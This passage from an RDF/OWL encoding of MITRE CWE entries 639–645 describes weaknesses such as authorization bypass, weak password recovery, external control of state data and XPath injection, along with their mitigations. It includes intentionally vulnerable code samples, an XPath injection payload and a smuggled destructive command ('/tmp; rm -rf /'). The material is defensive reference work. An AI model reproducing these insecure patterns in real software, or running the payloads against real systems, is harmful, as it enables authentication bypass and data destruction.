     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Do not use \"forgotten password\" functionality. But if you must, ensure that you are only providing information to the actual user, e.g. by using an email address or challenge question that the legitimate user already provided in the past; do not allow the current user to change this identity information until the correct password has been provided."^^xsd:string, 
                 rdfs:comment "When prompting for a password change, force the user to provide the original password in addition to the new password."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "This code changes a user's password.

Example Language: PHP /* (bad code) */
$user = $_GET['user'];
$pass = $_GET['pass'];
$checkpass = $_GET['checkpass'];
if ($pass == $checkpass) {
SetUserPassword($user, $pass);
}
While the code confirms that the requesting user typed the same new password twice, it does not confirm that the user requesting the password change is the same user whose password will be changed. An attacker can request a change of another user's password and gain control of the victim's account."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     weakness_ordinalities  "Primary"^^xsd:string,
     weakness_ordinalities  "Resultant"^^xsd:string
    
    
Individual: CWE-639_Authorization_Bypass_Through_User-Controlled_Key

    Annotations: 
        rdfs:comment "Alternate Terms
Insecure Direct Object Reference:	
The \"Insecure Direct Object Reference\" term, as described in the OWASP Top Ten, is broader than this CWE because it also covers path traversal (CWE-22). Within the context of vulnerability theory, there is a similarity between the OWASP concept and CWE-706: Use of Incorrectly-Resolved Name or Reference.
Horizontal Authorization:	
\"Horizontal Authorization\" is used to describe situations in which two users have the same privilege level, but must be prevented from accessing each other's resources. This is fairly common when using key-based access to resources in a multi-user context."^^xsd:string,
        rdfs:comment "Retrieval of a user record occurs in the system based on some key value that is under user control. The key would typically identify a user-related record stored in the system and would be used to lookup that record for presentation to the user. It is likely that an attacker would have to be an authenticated user in the system. However, the authorization process would not properly check the data access operation to ensure that the authenticated user performing the operation has sufficient entitlements to perform the requested data access, hence bypassing any other authorization checks present in the system.

For example, attackers can look at places where user specific data is retrieved (e.g. search screens) and determine whether the key for the item being looked up is controllable externally. The key may be a hidden field in the HTML form field, might be passed as a URL parameter or as an unencrypted cookie variable, then in each of these cases it will be possible to tamper with the key value.

One manifestation of this weakness is when a system uses sequential or otherwise easily-guessable session IDs that would allow one user to easily switch to another user's session and read/modify their data."^^xsd:string,
        rdfs:comment "The system's authorization functionality does not prevent one user from gaining access to another user's data or record by modifying the key value identifying the data."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     ID  "639"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "Access control checks for specific user data or functionality can be bypassed."^^xsd:string
                 
                 access_control  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "Horizontal escalation of privilege is possible (one user can view/modify information of another user)."^^xsd:string, 
                 rdfs:comment "Vertical escalation of privilege is possible if the user-controlled key is actually a flag that indicates administrator status, allowing the attacker to gain administrative access."^^xsd:string
                 
                 access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "For each and every data access, ensure that the user has sufficient privilege to access the record that is being requested."^^xsd:string, 
                 rdfs:comment "Make sure that the key that is used in the lookup of a specific user's record is not controllable externally by the user or that any tampering can be detected."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Use encryption in order to make it more difficult to guess other legitimate values of the key or associate a digital signature with the key so that the server can verify that there has been no tampering."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Make sure that the key that is used in the lookup of a specific user's record is not controllable externally by the user or that any tampering can be detected."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-640_Weak_Password_Recovery_Mechanism_for_Forgotten_Password

    Annotations: 
        rdfs:comment "It is common for an application to have a mechanism that provides a means for a user to gain access to their account in the event they forget their password. Very often the password recovery mechanism is weak, which has the effect of making it more likely that it would be possible for a person other than the legitimate system user to gain access to that user's account. Weak password recovery schemes completely undermine a strong password authentication scheme.

This weakness may be that the security question is too easy to guess or find an answer to (e.g. because the question is too common, or the answers can be found using social media). Or there might be an implementation weakness in the password recovery mechanism code that may for instance trick the system into e-mailing the new password to an e-mail account other than that of the user. There might be no throttling done on the rate of password resets so that a legitimate user can be denied service by an attacker if an attacker tries to recover their password in a rapid succession. The system may send the original password to the user rather than generating a new temporary password. In summary, password recovery functionality, if not carefully designed and implemented can often become the system's weakest link that can be misused in a way that would allow an attacker to gain unauthorized access to the system."^^xsd:string,
        rdfs:comment "Maintenance
This entry might be reclassified as a category or \"loose composite,\" since it lists multiple specific errors that can make the mechanism weak. However, under view 1000, it could be a weakness under protection mechanism failure, although it is different from most PMF issues since it is related to a feature that is designed to bypass a protection mechanism (specifically, the lack of knowledge of a password)."^^xsd:string,
        rdfs:comment "Maintenance
This entry probably needs to be split; see extended description."^^xsd:string,
        rdfs:comment "The software contains a mechanism for users to recover or change their passwords without knowing the original password, but the mechanism is weak."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1010_Authenticate_Actors,
     related_attack_patterns  CAPEC-50,
     ID  "640"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "An attacker could gain unauthorized access to the system by retrieving legitimate user's authentication credentials."^^xsd:string
                 
                 access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Assign a new temporary password rather than revealing the original password."^^xsd:string, 
                 rdfs:comment "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Do not use standard weak security questions and use several security questions."^^xsd:string, 
                 rdfs:comment "Make sure that all input supplied by the user to the password recovery mechanism is thoroughly filtered and validated."^^xsd:string, 
                 rdfs:comment "Make sure that there is throttling on the number of incorrect answers to a security question. Disable the password recovery functionality after a certain (small) number of incorrect guesses."^^xsd:string, 
                 rdfs:comment "Never allow the user to control what e-mail address the new password will be sent to in the password recovery mechanism."^^xsd:string, 
                 rdfs:comment "Require that the user properly answers the security question prior to resetting their password and sending the new password to the e-mail address of record."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "An attacker could deny service to legitimate system users by launching a brute force attack on the password recovery mechanism using user ids of legitimate users."^^xsd:string
                 
                 availability  "DoS: Resource Consumption (Other)"^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The system's security functionality is turned against the system by the attacker."^^xsd:string, 
                 rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "A famous example of this type of weakness being exploited is the eBay attack. eBay always displays the user id of the highest bidder. In the final minutes of the auction, one of the bidders could try to log in as the highest bidder three times. After three incorrect log in attempts, eBay password throttling would kick in and lock out the highest bidder's account for some time. An attacker could then make their own bid and their victim would not have a chance to place the counter bid because they would be locked out. Thus an attacker could win the auction."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     implementation  ""^^xsd:string,
     integrity  "Other"^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     other  "Other"^^xsd:string
    
    
Individual: CWE-641_Improper_Restriction_of_Names_for_Files_and_Other_Resources

    Annotations: 
        rdfs:comment "The application constructs the name of a file or other resource using input from an upstream component, but it does not restrict or incorrectly restricts the resulting name."^^xsd:string,
        rdfs:comment "This may produce resultant weaknesses. For instance, if the names of these resources contain scripting characters, it is possible that a script may get executed in the client's browser if the application ever displays the name of the resource on a dynamically generated web page. Alternately, if the resources are consumed by some application parser, a specially crafted name can exploit some vulnerability internal to the parser, potentially resulting in execution of arbitrary code on the server machine. The problems will vary based on the context of usage of such malformed resource names and whether vulnerabilities are present in or assumptions are made by the targeted technology that would make code execution possible."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1019_Validate_Inputs,
     ID  "641"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Do not allow users to control names of resources used on the server side."^^xsd:string, 
                 rdfs:comment "Make sure that technologies consuming the resources are not vulnerable (e.g. buffer overflow, format string, etc.) in a way that would allow code execution if the name of the resource is malformed."^^xsd:string, 
                 rdfs:comment "Perform whitelist input validation at entry points and also before consuming the resources. Reject bad file names rather than trying to cleanse them."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     availability  "DoS: Crash, Exit, or Restart"^^xsd:string,
     availability  "Execute Unauthorized Code or Commands"^^xsd:string,
     availability  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "DoS: Crash, Exit, or Restart"^^xsd:string,
     confidentiality  "Execute Unauthorized Code or Commands"^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Execute Unauthorized Code or Commands"^^xsd:string,
     likelihood_of_exploit  "Low"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-642_External_Control_of_Critical_State_Data

    Annotations: 
        rdfs:comment "If an attacker can modify the state information without detection, then it could be used to perform unauthorized actions or access unexpected resources, since the application programmer does not expect that the state can be changed.

State information can be stored in various locations such as a cookie, in a hidden web form field, input parameter or argument, an environment variable, a database record, within a settings file, etc. All of these locations have the potential to be modified by an attacker. When this state information is used to control security or determine resource usage, then it may create a vulnerability. For example, an application may perform authentication, then save the state in an \"authenticated=true\" cookie. An attacker may simply create this cookie in order to bypass the authentication."^^xsd:string,
        rdfs:comment "The software stores security-critical state information about its users, or the software itself, in a location that is accessible to unauthorized actors."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
     Annotations: rdfs:comment "Telnet daemon allows remote clients to specify critical environment variables for the server, leading to code execution."^^xsd:string
                 
                 references  CVE-1999-0073,
     
     Annotations: rdfs:comment "Shopping cart allows price modification via hidden form field."^^xsd:string
                 
                 references  CVE-2000-0102,
     
     Annotations: rdfs:comment "Shopping cart allows price modification via hidden form field."^^xsd:string
                 
                 references  CVE-2000-0253,
     
     Annotations: rdfs:comment "Mail client stores password hashes for unrelated accounts in a hidden form field."^^xsd:string
                 
                 references  CVE-2005-2428,
     
     Annotations: rdfs:comment "Untrusted search path vulnerability through modified LD_LIBRARY_PATH environment variable."^^xsd:string
                 
                 references  CVE-2006-7191,
     
     Annotations: rdfs:comment "Untrusted search path vulnerability through modified LD_LIBRARY_PATH environment variable."^^xsd:string
                 
                 references  CVE-2007-4432,
     
     Annotations: rdfs:comment "Privileged program trusts user-specified environment variable to modify critical configuration settings."^^xsd:string
                 
                 references  CVE-2008-0306,
     
     Annotations: rdfs:comment "Server allows client to specify the search path, which can be modified to point to a program that the client has uploaded."^^xsd:string
                 
                 references  CVE-2008-1319,
     
     Annotations: rdfs:comment "Application allows admin privileges by setting a cookie value to \"admin.\""^^xsd:string
                 
                 references  CVE-2008-4752,
     
     Annotations: rdfs:comment "Application allows admin privileges by setting a cookie value to \"admin.\""^^xsd:string
                 
                 references  CVE-2008-5065,
     
     Annotations: rdfs:comment "Application allows admin privileges by setting a cookie value to \"admin.\""^^xsd:string
                 
                 references  CVE-2008-5125,
     
     Annotations: rdfs:comment "Setting of a language preference in a cookie enables path traversal attack."^^xsd:string
                 
                 references  CVE-2008-5642,
     
     Annotations: rdfs:comment "Calendar application allows bypass of authentication by setting a certain cookie value to 1."^^xsd:string
                 
                 references  CVE-2008-5738,
     
     Annotations: rdfs:comment "Exploitation of Trusted Credentials"^^xsd:string
                 
                 related_attack_patterns  CAPEC-21,
     
     Annotations: rdfs:comment "Accessing/Intercepting/Modifying HTTP Cookies"^^xsd:string
                 
                 related_attack_patterns  CAPEC-31,
     ID  "642"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "An attacker could potentially modify the state in malicious ways. If the state is related to the privileges or level of authentication that the user has, then state modification might allow the user to bypass authentication or elevate privileges."^^xsd:string
                 
                 access_control  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "An attacker could potentially modify the state in malicious ways. If the state is related to the privileges or level of authentication that the user has, then state modification might allow the user to bypass authentication or elevate privileges."^^xsd:string
                 
                 access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server."^^xsd:string, 
                 rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string, 
                 rdfs:comment "Store state information on the server side only. Ensure that the system definitively and unambiguously keeps track of its own state and user state and has rules defined for legitimate state transitions. Do not allow any application user to affect state directly in any way other than through legitimate actions leading to state transitions."^^xsd:string, 
                 rdfs:comment "Strategy: Attack Surface Reduction
Store state information and sensitive data on the server side only.
Ensure that the system definitively and unambiguously keeps track of its own state and user state and has rules defined for legitimate state transitions. Do not allow any application user to affect state directly in any way other than through legitimate actions leading to state transitions.
If information must be stored on the client, do not do so without encryption and integrity checking, or otherwise having a mechanism on the server side to catch tampering. Use a message authentication code (MAC) algorithm, such as Hash Message Authentication Code (HMAC) [REF-529]. Apply this against the state or sensitive data that you has to be exposed, which can guarantee the integrity of the data - i.e., that the data has not been modified. Ensure that a strong hash function is used (CWE-328)."^^xsd:string, 
                 rdfs:comment "Strategy: Libraries or Frameworks
Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
With a stateless protocol such as HTTP, use some frameworks can maintain the state for you.
Examples include ASP.NET View State and the OWASP ESAPI Session Management feature.
Be careful of language features that provide state support, since these might be provided as a convenience to the programmer and may not be considering security."^^xsd:string, 
                 rdfs:comment "Understand all the potential locations that are accessible to attackers. For example, some programmers assume that cookies and hidden form fields cannot be modified by an attacker, or they may not consider that environment variables can be modified before a privileged program is invoked."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "By modifying state variables, the attacker could violate the application's expectations for the contents of the state, leading to a denial of service due to an unexpected error condition."^^xsd:string
                 
                 availability  "DoS: Crash, Exit, or Restart"^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "The state variables may contain sensitive information that should not be known by the client."^^xsd:string
                 
                 confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
In the following example, an authentication flag is read from a browser cookie, thus allowing for external control of user state data.

Example Language: Java  /* (bad code) */
Cookie[] cookies = request.getCookies();
for (int i =0; i< cookies.length; i++) {
Cookie c = cookies[i];
if (c.getName().equals(\"authenticated\") && Boolean.TRUE.equals(c.getValue())) {
authenticated = true;
}
}"^^xsd:string, 
                 rdfs:comment "Example 2
The following code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as \"../../tomcat/conf/server.xml\", which causes the application to delete one of its own configuration files (CWE-22).

Example Language: Java  /* (bad code) */
String rName = request.getParameter(\"reportName\");
File rFile = new File(\"/usr/local/apfr/reports/\" + rName);
...
rFile.delete();"^^xsd:string, 
                 rdfs:comment "Example 3
The following code uses input from a configuration file to determine which file to open and echo back to the user. If the program runs with privileges and malicious users can change the configuration file, they can use the program to read any file on the system that ends with the extension .txt.

Example Language: Java  /* (bad code) */
fis = new FileInputStream(cfg.getProperty(\"sub\")+\".txt\");
amt = fis.read(arr);
out.println(arr);"^^xsd:string, 
                 rdfs:comment "Example 4
This program is intended to execute a command that lists the contents of a restricted directory, then performs other actions. Assume that it runs with setuid privileges in order to bypass the permissions check by the operating system.

Example Language: C  /* (bad code) */
#define DIR \"/restricted/directory\"

char cmd[500];
sprintf(cmd, \"ls -l %480s\", DIR);
/* Raise privileges to those needed for accessing DIR. */ 

RaisePrivileges(...);
system(cmd);
DropPrivileges(...);
...
This code may look harmless at first, since both the directory and the command are set to fixed values that the attacker can't control. The attacker can only see the contents for DIR, which is the intended program behavior. Finally, the programmer is also careful to limit the code that executes with raised privileges.

However, because the program does not modify the PATH environment variable, the following attack would work:

The user sets the PATH to reference a directory under that user's control, such as \"/my/dir/\".
The user creates a malicious program called \"ls\", and puts that program in /my/dir
The user executes the program.
When system() is executed, the shell consults the PATH to find the ls program
The program finds the malicious program, \"/my/dir/ls\". It doesn't find \"/bin/ls\" because PATH does not contain \"/bin/\".
The program executes the malicious program with the raised privileges."^^xsd:string, 
                 rdfs:comment "Example 5
This code prints all of the running processes belonging to the current user.

Example Language: PHP  /* (bad code) */

//assume getCurrentUser() returns a username that is guaranteed to be alphanumeric (CWE-78) 
$userName = getCurrentUser();
$command = 'ps aux | grep ' . $userName;
system($command);
This program is also vulnerable to a PATH based attack (CWE-426), as an attacker may be able to create malicious versions of the ps or grep commands. While the program does not explicitly raise privileges to run the system commands, the PHP interpreter may by default be running with higher privileges than users."^^xsd:string, 
                 rdfs:comment "Example 6
The following code segment implements a basic server that uses the \"ls\" program to perform a directory listing of the directory that is listed in the \"HOMEDIR\" environment variable. The code intends to allow the user to specify an alternate \"LANG\" environment variable. This causes \"ls\" to customize its output based on a given language, which is an important capability when supporting internationalization.

Example Language: Perl  /* (bad code) */
$ENV{\"HOMEDIR\"} = \"/home/mydir/public/\";
my $stream = AcceptUntrustedInputStream();
while (<$stream>) {
chomp;
if (/^ENV ([\\w\\_]+) (.*)/) {
$ENV{$1} = $2;
}
elsif (/^QUIT/) { ... }
elsif (/^LIST/) {
open($fh, \"/bin/ls -l $ENV{HOMEDIR}|\");
while (<$fh>) {
SendOutput($stream, \"FILEINFO: $_\");
}
close($fh);
}
}
The programmer takes care to call a specific \"ls\" program and sets the HOMEDIR to a fixed value. However, an attacker can use a command such as \"ENV HOMEDIR /secret/directory\" to specify an alternate directory, enabling a path traversal attack (CWE-22). At the same time, other attacks are enabled as well, such as OS command injection (CWE-78) by setting HOMEDIR to a value such as \"/tmp; rm -rf /\". In this case, the programmer never intends for HOMEDIR to be modified, so input validation for HOMEDIR is not the solution. A partial solution would be a whitelist that only allows the LANG variable to be specified in the ENV command. Alternately, assuming this is an authenticated user, the language could be stored in a local file so that no ENV command at all would be needed.

While this example may not appear realistic, this type of problem shows up in code fairly frequently. See CVE-1999-0073 in the observed examples for a real-world example with similar behaviors."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Environment Hardening
When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Environment Hardening
When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues."^^xsd:string
                 
                 operation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Often Prevalent"^^xsd:string
                 
                 technologies  "Web Server"^^xsd:string,
     
     Annotations: rdfs:comment "Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible."^^xsd:string, 
                 rdfs:comment "Use dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results."^^xsd:string, 
                 rdfs:comment "Use tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules."^^xsd:string
                 
                 testing  ""^^xsd:string
    
    
Individual: CWE-643_Improper_Neutralization_of_Data_within_XPath_Expressions

    Annotations: 
        rdfs:comment "Relationship:
This weakness is similar to other weaknesses that enable injection style attacks, such as SQL injection, command injection and LDAP injection. The main difference is that the target of attack here is the XML database."^^xsd:string,
        rdfs:comment "The net effect is that the attacker will have control over the information selected from the XML database and may use that ability to control application flow, modify logic, retrieve unauthorized data, or bypass important checks (e.g. authentication)."^^xsd:string,
        rdfs:comment "The software uses external input to dynamically construct an XPath expression used to retrieve data from an XML database, but it does not neutralize or incorrectly neutralizes that input. This allows an attacker to control the structure of the query."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1019_Validate_Inputs,
     ID  "643"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "Controlling application flow (e.g. bypassing authentication)."^^xsd:string
                 
                 access_control  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "The attacker could read restricted XML content."^^xsd:string
                 
                 confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "Consider the following simple XML document that stores authentication information and a snippet of Java code that uses XPath query to retrieve authentication information:

(informative)
Example Language: XML 
<users>
<user>
<login>john</login>
<password>abracadabra</password>
<home_dir>/home/john</home_dir>
</user>
<user>
<login>cbc</login>
<password>1mgr8</password>
<home_dir>/home/cbc</home_dir>
</user>
</users>
The Java code used to retrieve the home directory based on the provided credentials is:

(bad code)
Example Language: Java 
XPath xpath = XPathFactory.newInstance().newXPath();
XPathExpression xlogin = xpath.compile(\"//users/user[login/text()='\" + login.getUserName() + \"' and password/text() = '\" + login.getPassword() + \"']/home_dir/text()\");
Document d = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(new File(\"db.xml\"));
String homedir = xlogin.evaluate(d);
Assume that user \"john\" wishes to leverage XPath Injection and login without a valid password. By providing a username \"john\" and password \"' or ''='\" the XPath expression now becomes

(attack code)
 
//users/user[login/text()='john' or ''='' and password/text() = '' or ''='']/home_dir/text()
which, of course, lets user \"john\" login without a valid password, thus bypassing authentication."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Properly validate user input. Reject data where appropriate, filter where appropriate and escape where appropriate. Make sure input that will be used in XPath queries is safe in that context."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Use parameterized XPath queries (e.g. using XQuery). This will help ensure separation between data plane and control plane."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-645_Overly_Restrictive_Account_Lockout_Mechanism

    Annotations: 
        rdfs:comment "Account lockout is a security feature often present in applications as a countermeasure to the brute force attack on the password based authentication mechanism of the system. After a certain number of failed login attempts, the users' account may be disabled for a certain period of time or until it is unlocked by an administrator. Other security events may also possibly trigger account lockout. However, an attacker may use this very security feature to deny service to legitimate system users. It is therefore important to ensure that the account lockout security mechanism is not overly restrictive."^^xsd:string,
        rdfs:comment "The software contains an account lockout protection mechanism, but the mechanism is too restrictive and can be triggered too easily, which allows attackers to deny service to legitimate users by causing their accounts to be locked out."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1017_Lock_Computer,
     ID  "645"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Consider alternatives to account lockout that would still be effective against password brute force attacks, such as presenting the user machine with a puzzle to solve (makes it do some computation)."^^xsd:string, 
                 rdfs:comment "Implement a lockout timeout that grows as the number of incorrect login attempts goes up, eventually resulting in a complete lockout."^^xsd:string, 
                 rdfs:comment "Implement more intelligent password throttling mechanisms such as those which take IP address into account, in addition to the login name."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "Users could be locked out of accounts."^^xsd:string
                 
                 availability  "DoS: Resource Consumption (Other)"^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
